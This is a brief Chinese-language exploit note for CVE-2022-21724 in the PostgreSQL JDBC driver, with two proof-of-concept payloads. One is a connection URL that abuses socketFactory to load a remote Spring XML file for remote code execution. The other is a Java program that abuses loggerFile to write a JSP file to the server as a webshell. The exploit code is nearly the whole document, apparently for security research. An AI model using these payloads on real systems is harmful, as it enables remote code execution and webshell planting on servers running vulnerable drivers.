



### 任意类实例化 -> RCE

PoC
```
DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
```


### 文件写入

PoC
```java
import java.sql.DriverManager;

public class cve_2022_21724_filewrite {
    public static void main(String[]args)throws Exception{
        String loggerLevel="DEBUG";
        String loggerFile="../hack.jsp";
        String shellContent="<%25test;%25>";

        String dbUrl = "jdbc:postgresql:///?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+"&"+shellContent;
        System.out.println(dbUrl);
        DriverManager.getConnection(dbUrl);
    }
}
```

参考文章

- https://security.snyk.io/vuln/SNYK-JAVA-ORGPOSTGRESQL-2390459
- https://forum.butian.net/share/1339

